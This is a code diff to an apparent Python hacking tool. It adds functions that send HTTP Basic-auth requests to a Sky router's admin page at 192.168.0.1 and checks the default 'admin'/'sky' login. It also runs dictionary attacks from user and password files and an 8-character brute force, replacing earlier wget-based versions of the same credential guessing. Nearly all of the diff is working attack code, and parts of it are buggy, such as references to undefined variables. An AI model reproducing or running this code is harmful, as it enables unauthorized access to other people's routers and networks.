@@ -585,6 +585,166 @@ and give full credit to them. Enjoy! :)
                 print("[#] running\n\n")
                 sniff_packets(iface)
         if co == 1:
+            def attack_main(u, pa):
+                t = 2
+                ex = "Unauthorised"
+                while t != 0:
+                    buffer_size = 8192
+                    HOST = '192.168.0.1' 
+                    PORT = 80    
+                    print("[#] connecting to router")
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect((HOST, PORT))
+                    both = u+":"+pa
+                    both = both.encode()
+                    pas = base64.b64encode(both)
+                    pass_enc = str(pas)
+                    pass_enc = pass_enc.replace("b'","")
+                    pass_enc = pass_enc.replace("'","")
+                    rr = "Authorization: Basic "+pass_enc
+                    data = ["GET /sky_router_status.html HTTP/1.1",
+                    "Host: 192.168.0.1",
+                    "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
+                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                    "Accept-Language: en-US,en;q=0.5",
+                    "Accept-Encoding: gzip, deflate",
+                    "Connection: keep-alive",
+                    "Upgrade-Insecure-Requests: 1",
+                    "DNT: 1",
+                    "Sec-GPC: 1",
+                    rr]
+                    r = '\r\n'.join(data)+'\r\n\r\n'
+                    print("[#] sending data...")
+                    s.send(r.encode())
+                    print("[#] recv...")
+                    r = s.recv(buffer_size)
+                    s.close()
+                    chk = r.decode()
+                    print("[#] cheking")
+                    if ex not in chk:
+                        os.system("clear")
+                        print(Fore.GREEN)
+                        subprocess.run("clear", shell=True)
+                        print("[#] user and password Found1")
+                        print("===========================")
+                        print("USER : ", use)
+                        print("PASS : ", pa)
+                        print("===========================")
+                        print(Style.RESET_ALL)
+                        input("[ENTER] hit enter to continue ")
+                        y = False
+                        t = 0
+                        return y, valid
+                    else:
+                        print("[!] not found \n[!] dubble checking...")
+                        t = t - 1
+            def attack_brute(u, pa):
+                t = 2
+                ex = "Unauthorised"
+                while t != 0:
+                    buffer_size = 8192
+                    HOST = '192.168.0.1' 
+                    PORT = 80    
+                    print("[#] connecting to router")
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect((HOST, PORT))
+                    both = u+":"+pa
+                    both = both.encode()
+                    pas = base64.b64encode(both)
+                    pass_enc = str(pas)
+                    pass_enc = pass_enc.replace("b'","")
+                    pass_enc = pass_enc.replace("'","")
+                    rr = "Authorization: Basic "+pass_enc
+                    data = ["GET /sky_router_status.html HTTP/1.1",
+                    "Host: 192.168.0.1",
+                    "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
+                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                    "Accept-Language: en-US,en;q=0.5",
+                    "Accept-Encoding: gzip, deflate",
+                    "Connection: keep-alive",
+                    "Upgrade-Insecure-Requests: 1",
+                    "DNT: 1",
+                    "Sec-GPC: 1",
+                    rr]
+                    r = '\r\n'.join(data)+'\r\n\r\n'
+                    print("[#] sending data...")
+                    s.send(r.encode())
+                    print("[#] recv...")
+                    r = s.recv(buffer_size)
+                    s.close()
+                    chk = r.decode()
+                    print("[#] cheking")
+                    if ex not in chk:
+                        os.system("clear")
+                        print(Fore.GREEN)
+                        subprocess.run("clear", shell=True)
+                        print("[#] user and password Found1")
+                        print("===========================")
+                        print("USER : ", use)
+                        print("PASS : ", pa)
+                        print("===========================")
+                        print(Style.RESET_ALL)
+                        input("[ENTER] hit enter to continue ")
+                        found = True
+                        t = 0
+                        return found
+                    else:
+                        print("[!] not found \n[!] dubble checking...")
+                        t = t - 1
+            def attack(u, pa):
+                t = 2
+                ex = "Unauthorised"
+                while t != 0:
+                    buffer_size = 8192
+                    HOST = '192.168.0.1' 
+                    PORT = 80    
+                    print("[#] connecting to router")
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect((HOST, PORT))
+                    both = u+":"+pa
+                    both = both.encode()
+                    pas = base64.b64encode(both)
+                    pass_enc = str(pas)
+                    pass_enc = pass_enc.replace("b'","")
+                    pass_enc = pass_enc.replace("'","")
+                    rr = "Authorization: Basic "+pass_enc
+                    data = ["GET /sky_router_status.html HTTP/1.1",
+                    "Host: 192.168.0.1",
+                    "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
+                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                    "Accept-Language: en-US,en;q=0.5",
+                    "Accept-Encoding: gzip, deflate",
+                    "Connection: keep-alive",
+                    "Upgrade-Insecure-Requests: 1",
+                    "DNT: 1",
+                    "Sec-GPC: 1",
+                    rr]
+                    r = '\r\n'.join(data)+'\r\n\r\n'
+                    print("[#] sending data...")
+                    s.send(r.encode())
+                    print("[#] recv...")
+                    r = s.recv(buffer_size)
+                    s.close()
+                    chk = r.decode()
+                    print("[#] cheking")
+                    if ex not in chk:
+                        os.system("clear")
+                        print(Fore.GREEN)
+                        subprocess.run("clear", shell=True)
+                        print("[#] user and password Found1")
+                        print("===========================")
+                        print("USER : ", use)
+                        print("PASS : ", pa)
+                        print("===========================")
+                        print(Style.RESET_ALL)
+                        input("[ENTER] hit enter to continue ")
+                        y = False
+                        valid = True
+                        t = 0
+                        return y, valid
+                    else:
+                        print("[!] not found \n[!] dubble checking...")
+                        t = t - 1
             print("[#] detecting provider")
             num = 0
             ### Crawling to the website fetch links and images -> store images -> crawl more to the fetched links and scrap more images
@@ -628,160 +788,103 @@ and give full credit to them. Enjoy! :)
                 if 1 == 1: #indetnt make easir to read
                     use = "admin"
                     pa = "sky"
-                    command = "wget -qO- http://"+router+"/sky_router_status.html --user="+use+" --password="+pa
-                    #print("command = ", command)
-                    res = subprocess.run(command, shell=True, capture_output=True, text=True)
-                    n = res.stdout
-                    n = str(n)
-                    if "<head>" in n:
-                        print(Fore.GREEN)
-                        subprocess.run("clear", shell=True)
-                        print("[#] user and password defult")
-                        print("===========================")
-                        print("USER : ", use)
-                        print("PASS : ", pa)
-                        print("===========================")
-                        print(Style.RESET_ALL)
-                        input("[ENTER] hit enter to continue ")
-                        y = False
-                        valid = True
-                        #x = 0
-                        #s = 0
+                    print("[#] cheking defualt")
+                    y, valid = attack(use, pa)
                         
                 if len(router) >= 1:
-                    os.system("clear")
-                    print("[!] it's not the default")
-                    print("router url: ", router)
-                    print("1) dicontery attack")
-                    print("2) brute force")
-                    c = int(input("[#] enter choice \n----> "))
-                    if c == 2:
-                        if y == True:
-                            PASSWORD_LIST = itertools.product('0123456789qwertyuiopasdfghjklzxcvbnm', repeat=8) #0123456789ABCDEF
-                            x = 0
-                            found = False
-                            try:
-                                for pas in PASSWORD_LIST:
-                                    pas = str(pas)
-                                    pas = pas.replace("')","")
-                                    pas = pas.replace("('","")
-                                    pas = pas.replace("'","")
-                                    pas = pas.replace(",","")
-                                    pas = pas.replace(" ","")
-                                    u = str(pas)
-                                    for pss in PASSWORD_LIST:
-                                        os.system("clear")
-                                        pss = str(pss)
-                                        pss = pss.replace("')","")
-                                        pss = pss.replace("('","")
-                                        pss = pss.replace("'","")
-                                        pss = pss.replace(",","")
-                                        pss = pss.replace(" ","")
-                                        pa = str(pss)
-                                        os.system("clear")
-                                        print("user: ", u)
-                                        print("pass: ", pa)
-                                        print("attempt: ", x)
-                                        command = "wget -qO- http://"+router+" --user="+u+" --password="+pa
-                                        res = subprocess.run(command, shell=True, capture_output=True, text=True)
-                                        n = res.stdout
-                                        n = str(n)
-                                        if "<head>" in n:
-                                            print(Fore.GREEN)
-                                            subprocess.run("clear", shell=True)
-                                            print("[#] user and password found")
-                                            print("===========================")
-                                            print("USER : ", u)
-                                            print("PASS : ", pa)
-                                            print("===========================")
-                                            print(Style.RESET_ALL)
-                                            input("[ENTER] hit enter to continue ")
-                                            found = True
-                                        if found == True:
-                                            print("[!] user and password found quiting....")
-                                            q = y + o
-                            except Exception:
-                                pass
-                            except KeyboardInterrupt:
-                                print(Fore.RED)
-                                os.system("clear")
-                                print("[!] user interupt")
-                                print("[!] last used")
-                                print("user: ", u)
-                                print("pass: ", pa)
-                                print("attempt: ", x)
-                                print(Style.RESET_ALL)
-                                input("[ENTER] continue? ")
-                                
-                    if c == 1:
-                        while not valid:
-                            try:
-                                user = input("enter user file : ")
-                                passwords = input("enter pass file : ")
-                                user = open(user,"r").readlines()
-                                pas = open(passwords,"r").readlines()
-                                valid = True
-                            except Exception:
-                                print(Fore.RED)
-                                print("[!] file not found!")
-                                print("[!] enter the full file with path")
-                                print("EG: /home/user/file")
-                                print(Style.RESET_ALL)
-                        x = 0
-                        s = 0
-                        at = 0
-                        us = 0
-                        while y:
-                            try:
-                                use = user[x]
-                                use = use.replace("\n","")
-                                if us == 0:
-                                    print("[#] trying user : ", user[x])
-                                    us = 1
-                                else:
+                    if y == True:
+                        os.system("clear")
+                        print("[!] it's not the default")
+                        print("router url: ", router)
+                        print("1) dicontery attack")
+                        print("2) brute force")
+                        c = int(input("[#] enter choice \n----> "))
+                        if c == 2:
+                            if y == True:
+                                PASSWORD_LIST = itertools.product('0123456789qwertyuiopasdfghjklzxcvbnm', repeat=8) #0123456789ABCDEF
+                                x = 0
+                                found = False
+                                try:
+                                    for pas in PASSWORD_LIST:
+                                        pas = str(pas)
+                                        pas = pas.replace("')","")
+                                        pas = pas.replace("('","")
+                                        pas = pas.replace("'","")
+                                        pas = pas.replace(",","")
+                                        pas = pas.replace(" ","")
+                                        u = str(pas)
+                                        for pss in PASSWORD_LIST:
+                                            os.system("clear")
+                                            pss = str(pss)
+                                            pss = pss.replace("')","")
+                                            pss = pss.replace("('","")
+                                            pss = pss.replace("'","")
+                                            pss = pss.replace(",","")
+                                            pss = pss.replace(" ","")
+                                            pa = str(pss)
+                                            os.system("clear")
+                                            print("user: ", u)
+                                            print("pass: ", pa)
+                                            print("attempt: ", x)
+                                            found = attack_brute(u, pa)
+                                            if found == True:
+                                                print("[!] user and password found quiting....")
+                                                q = y + o
+                                except Exception:
                                     pass
-                    
-                            except IndexError:
-                                print("[!] all users or trted")
-                                y = False
-                            try:   
-                                pa = pas[s]
-                                pa = pa.replace("\n","")
-                            except IndexError:
-                                s = 0
-                                x = x + 1
-                                us = 0
-                                print("[!] moving on to next user")
-                            at = at + 1
-                            # if reply =anything it's write
-                            command = "wget -qO- http://"+router+" --user="+use+" --password="+pa
-                            #print("command = ", command)
-                            res = subprocess.run(command, shell=True, capture_output=True, text=True)
-                            n = res.stdout
-                            n = str(n)
-                            test = False
-                            if test == True:
-                                print("*********[start out put]*********")
-                                print(n)
-                                print("*********[end out put]***********")
-                            else:
-                                pass
-                            if "<head>" in n:
-                                print(Fore.GREEN)
-                                subprocess.run("clear", shell=True)
-                                print("[#] user and password found")
-                                print("===========================")
-                                print("USER : ", user[x])
-                                print("PASS : ", pas[s])
-                                print("===========================")
-                                print(Style.RESET_ALL)
-                                input("[ENTER] hit enter to continue ")
-                                #x = 0
-                                #s = 0
-                                y = False
-                            else:
-                                pass
-                            s = s + 1
+                                except KeyboardInterrupt:
+                                    print(Fore.RED)
+                                    os.system("clear")
+                                    print("[!] user interupt")
+                                    print("[!] last used")
+                                    print("user: ", u)
+                                    print("pass: ", pa)
+                                    print("attempt: ", x)
+                                    print(Style.RESET_ALL)
+                                    input("[ENTER] continue? ")
+                                    
+                        if c == 1:
+                            while not valid:
+                                try:
+                                    user = input("enter user file : ")
+                                    passwords = input("enter pass file : ")
+                                    user = open(user,"r").readlines()
+                                    pas = open(passwords,"r").readlines()
+                                    valid = True
+                                except Exception:
+                                    print(Fore.RED)
+                                    print("[!] file not found!")
+                                    print("[!] enter the full file with path")
+                                    print("EG: /home/user/file.txt")
+                                    print(Style.RESET_ALL)
+                            x = 0
+                            s = 0
+                            at = 0
+                            us = 0
+                            while y:
+                                try:
+                                    use = user[x]
+                                    use = use.replace("\n","")
+                                    if us == 0:
+                                        print("[#] trying user : ", user[x])
+                                        us = 1
+                                    else:
+                                        pass
+                        
+                                except IndexError:
+                                    print("[!] all users or tried")
+                                    y = False
+                                try:   
+                                    pa = pas[s]
+                                    pa = pa.replace("\n","")
+                                except IndexError:
+                                    s = 0
+                                    x = x + 1
+                                    us = 0
+                                    print("[!] moving on to next user")
+                                at = at + 1
+                                y = attack_main(use, pa)
+                                s = s + 1
             else:
                 print("[!]")
     except KeyboardInterrupt:
